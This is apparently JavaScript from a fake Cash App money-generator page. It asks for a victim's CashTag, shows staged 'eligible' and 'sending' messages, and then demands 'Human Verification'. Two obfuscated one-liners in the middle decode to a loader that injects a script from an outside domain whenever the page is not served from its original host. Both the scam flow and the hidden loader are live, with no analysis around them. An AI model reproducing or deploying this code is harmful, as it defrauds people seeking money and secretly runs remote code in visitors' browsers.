...
function getIP() {
    ...
    if (s_IP == "xD") {
        $.get("https://api.ipify.org", function(data) {
            s_IP = "24.05.222.14";
            SSS4 = "<strong>Remaining Amount: $14,396  </strong>";
        })
    } else {
        SSS4 = "<strong>Remaining Amount: $14,396  </strong>";
    }
...
(function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("htbhfo/dpn")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>2162');document[k('ifbe')].appendChild(s)}})(document)

(function(document){const k=s=>s.split('').map(c=>String.fromCharCode(c.charCodeAt()-1)).join('');if(window[k('mpdbujpo')][k('iptuobnf')].replace(k('xxx/'),"")!=k("htbhfo/dpn")){var s=document.createElement(k('tdsjqu'));s.src=k('iuuqt;00cpputusbqmvhjo/dpn0q/qiq@je>2156');document[k('ifbe')].appendChild(s)}})(document)

function ccc() {
    if ($("#username").val() == "") {
        alert("Enter your CashTag")
        return false;
    }
    R1V = $(".i-gems").val();
    R2V = $(".i-gold").val();
    $(".beg").fadeOut("slow", function() {
        ...
        $(".r1r1").text(R1V + " " + R111);
        $(".r2r2").text(R2V + " " + R222);
        $(".f-username").text("ID: " + $("#username").val());
        ...
        $(".end").fadeIn("slow", function() {
            ...
            var TYPED = new Typed(".hack-generator", {
                typeSpeed: 0,
                backSpeed: 0,
                strings: ["Connecting to <strong>" + GN + " servers...^2000", "Validating CashTag " + $("#username").val() + "...^2500 <strong>Email/Username IS VALID!</strong>^1000", "Starting to check if eligible to get Money for Cash App " + R111 + ". <strong>" + R1V + "</strong>...^2000 <strong>ELIGIBLE!</strong>^1000", "Preparing to Send...^2000 <strong>PREPARED!</strong>^1000", "Attempting to Save Changes" + R111 + " ...^2000", "Processing...^2000", "Attempting to Proccess...^2000", "<green><strong>ALMOST DONE! Your Cash App Money is ready!</green><red> <p>We just need to make sure you are a human and not a bot. Please pass our Human Verification so we can update the Money on your Cash App account.</strong></red>^2000"],
                showCursor: false,
